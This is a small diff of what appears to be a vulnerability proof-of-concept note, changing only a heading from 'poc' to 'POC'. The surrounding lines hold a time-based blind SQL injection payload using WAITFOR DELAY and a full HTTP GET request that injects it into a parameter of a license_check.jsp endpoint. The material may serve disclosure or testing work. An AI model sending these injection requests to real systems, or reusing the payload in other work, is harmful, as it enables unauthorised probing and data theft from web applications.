@@ -6,7 +6,7 @@
 ';WAITFOR DELAY '0:0:5'-- q
 ```
 
-## poc
+## POC
 ```
 
 GET /u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
